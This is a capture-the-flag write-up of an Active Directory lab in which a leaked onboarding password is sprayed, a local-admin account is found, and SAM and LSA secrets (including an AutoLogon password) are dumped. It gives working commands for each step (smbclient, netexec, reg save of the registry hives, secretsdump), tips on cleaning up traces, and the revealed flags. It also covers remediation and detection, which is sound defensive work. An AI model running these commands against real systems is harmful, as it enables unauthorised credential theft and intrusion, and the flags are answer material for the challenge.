---
subtitle: Catastrophic Failure
author:   Frederick Jeffcock
version:  0.1.0
---

**Lab:** HOUNDLABS.EPI (G-SEC-500-MPL-5-1-bloodhound-1) | **Category:** Misconfig |
**Difficulty:** Easy | **Points:** 1750 (decays with solves) | **Flag:**
<details><summary>reveal</summary><code>EPI{DumP1nG_H45h3s_L1k3_4_B0ss}</code></details>

**Primary Technique(s):** OS Credential Dumping — SAM/LSA Secrets
(T1003.002, T1003.004); Unsecured Credentials in Registry — Windows
AutoLogon (T1552.002)

> Description: *"An employee not listening to IT is bad, but what would happen
> if it were an administrator not listening?"*

Working log (every command tried, every dead end): `challenges/catastrophic-failure.md`.
Related challenge: [Instructions unclear](../../challenges/instructions-unclear.md).

## Executive Summary

The domain's IT onboarding process sets every new account to a shared default
password (`F3nR1rS3c!`) that is supposed to be changed within five business
days. Two accounts never changed it. One of them, `a.nozer`, turns out to
have genuine local Administrator rights on a workstation (`ARGOS`) — not
because of any AD group membership, but because someone locally configured it
that way and never revisited it. That local-admin foothold is enough to dump
the host's LSA (Local Security Authority) secrets, a protected registry store
meant only for the operating system itself. Sitting inside those secrets,
alongside the machine's real Kerberos keys and DPAPI material, is the flag —
stored as the **Windows AutoLogon password** (`DefaultPassword`), a real
feature an administrator configured on this host to skip the login screen and
then forgot was sitting there in cleartext-recoverable form. That is the
"catastrophic failure": not a single dramatic exploit, but an accumulation of
small administrative carelessness (a shared default password nobody enforced
changing, a local-admin grant nobody revoked, an AutoLogon password nobody
removed) culminating in full compromise of whatever was stored there.

## Investigation & Technical Analysis

### Technical Incident Overview

A world-readable SMB share leaked a shared onboarding password. Password
spraying that value against the enumerated user list found two accounts still
using it, one of which (`a.nozer`) held undocumented local-admin rights on a
workstation (`ARGOS`, `10.42.0.102`). That access was used to dump the host's
LSA secrets, exposing a cleartext Windows AutoLogon password whose value was
the target flag.

### Scope & Methodology

- Attacker shell with network access to `10.42.0.0/24` and Kerberos/DNS
  resolution for `HOUNDLABS.EPI` (in this lab: the `exegol-ad-lab` container
  with its VPN profile up).
- Starting credentials: `pentester:Password123!`.
- Tooling: `smbclient`, `pdftotext`, `netexec` (`nxc`) — all present in the
  exegol AD-pentest toolkit; equivalent steps are possible with Impacket's
  `secretsdump.py` alone if `netexec` isn't available. See `tools/smbclient.md`,
  `tools/pdftotext.md`, `tools/netexec.md`, `tools/secretsdump.md`.
- Enumeration approach: unauthenticated SMB share read → password spray
  against the full enumerated user list → per-host/protocol admin check for
  each hit → local secret dump once admin access was confirmed.

### Attack Chain & Detailed Findings

#### 1. Recover the leaked default password

Every domain account starts on a shared temporary password, distributed via
a document sitting on a company-wide, read-accessible SMB share (**T1552.001
– Unsecured Credentials: Credentials In Files**):

```
smbclient -N //10.42.0.42/HUB -c 'get onboarding_memo.pdf'
pdftotext -layout onboarding_memo.pdf -
```

The memo, addressed "TO: All New Employees, FROM: IT Security & Operations
Team", states the default password for new accounts is `F3nR1rS3c!` and must
be changed within five business days or the account is locked. `HUB` requires
no special privilege to read — it's an intentionally public share ("A public
share for all HOUNDLABS's employees").

**Why this is already a misconfiguration:** a *shared* default password is
inherently weak — it only takes one employee to skip the mandatory change for
the password to become a standing credential anyone can try against the
entire user base. The memo being world-readable on a public share turns that
theoretical weakness into a practical one.

#### 2. Find accounts that never rotated it (T1110.003 – Password Spraying)

Spraying the leaked password against the full enumerated user list
(`notes/users.txt`, 88 accounts gathered earlier via `netexec smb --users`):

```
netexec smb 10.42.0.42 -u notes/users.txt -p 'F3nR1rS3c!' -d HOUNDLABS.EPI --continue-on-success
```

Two accounts authenticate cleanly: `d.folt` and `a.nozer`. Both are still
using the onboarding default.

> **Gotcha, worth noting for reproduction:** on a later re-run of this exact
> command, `netexec` treated `notes/users.txt` as a literal username instead
> of reading it as a userlist file, and failed (see
> `assets/01-spray-attempt-gotcha.png`) — caused by running the command from
> a working directory where that relative path didn't resolve. `netexec -u`
> only reads a file argument correctly if the path is valid from the current
> working directory; use an absolute path, or `cd` to the repo root first, to
> avoid this.

#### 3. Determine what those accounts are actually worth

Neither account holds any interesting Active Directory group membership —
nothing in BloodHound or LDAP marks them as privileged. Their real value only
shows up by testing them directly against every host and protocol in the
environment, since host-local rights (as opposed to domain rights) aren't
visible from AD alone:

```
netexec smb 10.42.0.102 -u a.nozer -p 'F3nR1rS3c!'
```

```
SMB   10.42.0.102   445   ARGOS   [*] Windows 10 / Server 2019 Build 19041 x64 (name:ARGOS) (domain:HOUNDLABS.EPI) (signing:False) (SMBv1:None)
SMB   10.42.0.102   445   ARGOS   [+] HOUNDLABS.EPI\a.nozer:F3nR1rS3c! (admin)
```

![netexec confirming a.nozer is a genuine local admin on ARGOS](assets/02-netexec-argos-admin.png)

The `(admin)` tag confirms `a.nozer` is a genuine member of
`BUILTIN\Administrators` on `ARGOS` specifically (independently verified via
an interactive session — `whoami /groups` shows High Mandatory Level, not the
weaker "Remote Management Users" PSRemoting-only pattern seen elsewhere in
this lab). This is host-local, not domain-wide: on every other workstation
`a.nozer` is either denied entirely or has ordinary user rights.

**Why this matters:** "an administrator not listening" — someone granted, or
failed to remove, local Administrator rights for an ordinary employee account
on this specific machine, and that grant was never audited or revoked.

#### 4. Dump the LSA secrets, not just the SAM database (T1003.002/T1003.004 – OS Credential Dumping: Security Account Manager / LSA Secrets)

Local Administrator rights on a Windows host allow dumping two very different
things:

- **The SAM database** — local *user account* password hashes. This is the
  obvious, commonly-taught target, and is as far as most first attempts go.
- **LSA secrets** (`HKLM\SECURITY\Policy\Secrets`) — a separate, more
  sensitive registry store the operating system itself uses before any user
  logs in: the machine account's own Kerberos keys/domain-join secret, any
  configured **AutoLogon password**, DPAPI machine/backup keys, and any
  service/scheduled-task "run as" credentials an administrator configured.
  It is protected by strict registry ACLs (`SYSTEM` only) and further
  encrypted with material derived from the SYSTEM hive, which is why reading
  it requires the SAM+SYSTEM+SECURITY hives together (or, remotely, genuine
  local-admin rights so a tool can perform the equivalent dump-and-decrypt).

```
netexec smb 10.42.0.102 -u a.nozer -p 'F3nR1rS3c!' --sam --lsa
```

```
SMB   10.42.0.102   445   ARGOS   [+] HOUNDLABS.EPI\a.nozer:F3nR1rS3c! (admin)
SMB   10.42.0.102   445   ARGOS   [*] Dumping SAM hashes
SMB   10.42.0.102   445   ARGOS   Administrator:500:aad3b435b51404eeaad3b435b51404ee:fafb12f22417628bb6422e9bb8686f5c:::
SMB   10.42.0.102   445   ARGOS   [*] Dumping LSA secrets
SMB   10.42.0.102   445   ARGOS   HOUNDLABS\ARGOS$:aes256-cts-hmac-sha1-96:68fa1bb76dc01e1a50bc7a9f088a7636f28612d18c9d0d2273bd32dfb1f86ae0
SMB   10.42.0.102   445   ARGOS   HOUNDLABS\ARGOS$:aad3b435b51404eeaad3b435b51404ee:aaad22592a5fd93ef0836a27c103b9b0:::
SMB   10.42.0.102   445   ARGOS   .\flag4:<redacted — see spoiler below>
SMB   10.42.0.102   445   ARGOS   dpapi_machinekey:0x78d8a45f0a375c91d9fdfb7e1ad90b4d02a8786e
                                   dpapi_userkey:0xecdda879ee266cb305e3cfeb870ae81d22e953d7
SMB   10.42.0.102   445   ARGOS   [+] Dumped 7 LSA secrets to /root/.nxc/logs/lsa/ARGOS_10.42.0.102_<timestamp>.secrets
```

<details><summary>netexec --sam --lsa output (spoiler — includes the flag in plaintext)</summary>

![netexec SAM+LSA secrets dump on ARGOS, including the flag inline in the AutoLogon secret](assets/03-netexec-sam-lsa-dump.png)

</details>

Every other entry in this output is a real Windows LSA secret with its
expected naming convention (`ARGOS$`'s own Kerberos keys, `dpapi_machinekey`,
`dpapi_userkey`). The `.\flag4:...` line, though labeled unusually by
`netexec`, is **not** a fake/manually-inserted secret — confirmed below, it's
the real Windows **AutoLogon** mechanism (**T1552.002 – Unsecured
Credentials: Credentials in Registry**).

**Manual equivalent** (useful to demonstrate the mechanics without relying on
a single tool's built-in module — this is also what we actually ran to
independently confirm the flag by hand):

```
evil-winrm -i 10.42.0.102 -u a.nozer -p 'F3nR1rS3c!'
```
```
reg save HKLM\SAM C:\Windows\Temp\sam.hive
reg save HKLM\SYSTEM C:\Windows\Temp\system.hive
reg save HKLM\SECURITY C:\Windows\Temp\security.hive
download C:\Windows\Temp\sam.hive sam.hive
download C:\Windows\Temp\system.hive system.hive
download C:\Windows\Temp\security.hive security.hive
```
```
secretsdump.py -sam sam.hive -system system.hive -security security.hive LOCAL
```

The real output from this manual path confirms it's specifically the
**`DefaultPassword`** AutoLogon secret
(`HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\DefaultPassword`)
— Windows stores this value in cleartext-recoverable form in LSA secrets so it
can retrieve it before any user has logged in and authenticated. This is a
well-documented real-world misconfiguration (MITRE ATT&CK
[T1552.002 – Unsecured Credentials: Credentials in Registry](https://attack.mitre.org/techniques/T1552/002/)),
usually set up for host convenience (skip the login screen) and then
forgotten about:

```
[*] DefaultPassword
(Unknown User):<redacted — see spoiler below>
```

`netexec`'s `.\flag4:...` line earlier is the *same* secret rendered
differently — it prints AutoLogon as `<DefaultDomainName>\<DefaultUserName>:<DefaultPassword>`,
which means the challenge additionally set `DefaultUserName` to `flag4` as
flavor text; `secretsdump.py` only surfaces the password half and labels the
username `(Unknown User)` since its own AutoLogon-username parsing didn't
resolve it the same way. Two independent tools, two different code paths,
same underlying registry value, same flag — solid corroboration that this is
the intended path, not a coincidence.

<details><summary>Flag (spoiler)</summary>

```
EPI{DumP1nG_H45h3s_L1k3_4_B0ss}
```

</details>

**Attacker operational security (would this have been flagged by a blue
team?):** This is, by a wide margin, the loudest and least-stealthy
technique in this engagement. `reg save HKLM\SAM`/`HKLM\SYSTEM`/`HKLM\SECURITY`
(or `netexec`'s `--sam --lsa` module performing the equivalent remotely)
is a well-known, heavily-signatured credential-dumping action — Sysmon
and most commercial EDR products ship a default detection for exactly
this registry-hive-export pattern, independent of which tool triggers
it, because there is no legitimate reason for an ordinary interactive
session to export these specific hives. There is essentially no way to
perform this step more quietly while still achieving the same result;
the only real lever an attacker has is **timing and cleanup** — doing it
once, quickly, and removing the exported hive files from disk
afterward (`C:\Windows\Temp\*.hive` in the manual reproduction path)
rather than leaving them sitting there as a secondary forensic artifact.
That cleanup step was **not performed** in this engagement's manual
reproduction — the exported hive files were left in place, which a real
incident responder would find immediately alongside the `reg save`
event itself. Given how unavoidably loud this technique is, a
genuinely OPSEC-conscious attacker would prefer the Shadow Credentials
route (see the Shadowy Technique write-up) wherever a target's privilege
can be reached that way instead, since it achieves a comparable
credential-access outcome with none of the noisy registry-export
footprint.

### Root Cause Analysis

A chain of small administrative lapses, each individually minor, compounding
into full exposure of sensitive local secrets:

1. A shared, guessable default password issued to every new account, with no
   technical enforcement of the "change it within 5 days" policy.
2. At least one account (`a.nozer`) never rotating it — the employee-level
   half of this problem, and the subject of the companion
   [Instructions unclear](../../challenges/instructions-unclear.md)
   challenge.
3. That same account being granted local Administrator rights on a
   workstation, with no process to review or revoke standing local-admin
   grants over time.
4. **Windows AutoLogon** (`DefaultUserName`/`DefaultPassword`) configured on
   this host, storing a password in cleartext-recoverable form in the LSA
   secrets store — readable by *any* local administrator, with no separate
   access control or encryption boundary protecting it from someone who
   already has host compromise.

### Indicators of Compromise

| Type | Value | Notes |
|---|---|---|
| Host | `ARGOS` / `10.42.0.102` | Workstation with the undocumented local-admin grant and LSA-secret exposure |
| Account | `a.nozer` | Local Administrator on ARGOS, never rotated the onboarding default password |
| Account | `d.folt` | Also found on the shared onboarding default (see `challenges/instructions-unclear.md`) |
| Shared credential | `F3nR1rS3c!` | Onboarding default password, leaked via a public SMB share |
| File | `//10.42.0.42/HUB/onboarding_memo.pdf` | Source of the leaked default password |
| Hash | `fafb12f22417628bb6422e9bb8686f5c` | ARGOS local `Administrator` (RID 500) NTLM hash, dumped from SAM |
| Machine secret | `HOUNDLABS\ARGOS$` Kerberos keys + NTLM hash | Dumped from LSA secrets alongside the flag |
| Registry key | `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\DefaultPassword` | AutoLogon secret containing the flag value |

## Impact Analysis

- **Severity:** High for the affected host, Medium domain-wide (CVSS-style
  reasoning: local network attack vector, low attack complexity once the
  shared password is known, no privileges required beyond an ordinary domain
  account, full confidentiality/integrity impact on the affected host's local
  secrets — comparable to a CVSS Base Score in the 7–8 range for the ARGOS
  host itself).
- **Blast radius:** Local Administrator on ARGOS grants full read access to
  that host's LSA secrets, including its own machine-account Kerberos keys
  (`ARGOS$`) and DPAPI material — enough to impersonate the machine account
  domain-wide for further attacks (see [Rise of the machines](../dacl/rise-of-the-machines.md)
  for what a compromised machine account's AD rights can lead to) and to
  decrypt any DPAPI-protected secrets (saved browser/credential-manager
  passwords) belonging to users who logged into this host.
- **Data exposed:** one cleartext AutoLogon password, one local Administrator
  NTLM hash, one machine account's full Kerberos key material.
- **Operational disruption:** none observed directly from this technique
  (read-only secret dumping); however, the underlying misconfigurations
  (shared onboarding password, unaudited local-admin grants, AutoLogon in
  cleartext) represent standing risk across the fleet, not just this one host.

## Remediation & Recommendations

- **Unique, randomly generated onboarding passwords** (or a forced
  change-on-first-logon that actually blocks further use of the account until
  completed), not a single shared value distributed in a plaintext document.
- **Restrict distribution** of any document containing credentials — it
  should never sit on a share readable by "all employees."
- **Periodic local-admin audits**: tools like BloodHound, or simply
  `netexec --local-groups Administrators` swept across the fleet, should be
  run regularly to catch accounts that have accumulated local-admin rights
  they no longer need.
- **Never configure AutoLogon** (`HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon`)
  on a domain-joined host — it's a permanent cleartext-recoverable credential
  for anyone who gets local-admin access, with no compensating control. If
  passwordless boot-time access is genuinely required, use a TPM-backed or
  managed-identity solution instead.
- **Never store secrets in the LSA secrets store (or anywhere in the local
  registry) for convenience.** Use a proper secrets manager, or at minimum
  Windows LAPS for anything password-like, so that local-admin compromise of
  one host doesn't hand over secrets unrelated to that host.
- **Detection opportunity:** dumping the SAM/SECURITY hives (via `reg save`
  or an equivalent remote registry read) is a well-known, loud action —
  Windows Event ID 4656/4663 on the registry hive files, and Sysmon/EDR
  alerts for `reg.exe save` targeting `SAM`/`SECURITY`/`SYSTEM`, are standard
  detections for this exact technique (frequently associated with
  Mimikatz/secretsdump-style credential dumping, e.g. MITRE ATT&CK
  T1003.002/T1003.004).

## Appendices

- Full working notes, every dead-end tried, and ongoing investigation for
  this challenge: [`challenges/catastrophic-failure.md`](../../challenges/catastrophic-failure.md)
  — this includes two other **real, literal flags** found along the way
  (<details><summary>reveal</summary><code>EPI{Add3d_K3yS_w17h0u7_P3rM5_M4giC}</code></details>
  via Shadow Credentials on `k.cheh`, and
  <details><summary>reveal</summary><code>EPI{P455_7h3_H45h_L1k3_4_Pro}</code></details>
  via local-admin-hash reuse onto ANUBIS) that were **confirmed to belong to different, separately-tracked
  challenge nodes**, not catastrophic-failure — see
  [Shadowy Technique](../dacl/shadowy-technique.md) and
  [Baton Passer](../misconfig/baton-passer.md) respectively. They are
  intentionally excluded from this write-up.
- Related write-up: [Instructions unclear](../../challenges/instructions-unclear.md) — the
  onboarding-memo leak and the employee-level (`d.folt`) half of this same
  default-password problem.
- Screenshots: `assets/01-spray-attempt-gotcha.png` through
  `assets/03-netexec-sam-lsa-dump.png` embedded inline above (captured
  2026-10-25). Still TODO: captures of the `onboarding_memo.pdf` content and
  the `evil-winrm` session confirming the manual `secretsdump.py`
  reproduction, per the report requirement to illustrate findings with
  screenshots/diagrams/timelines.
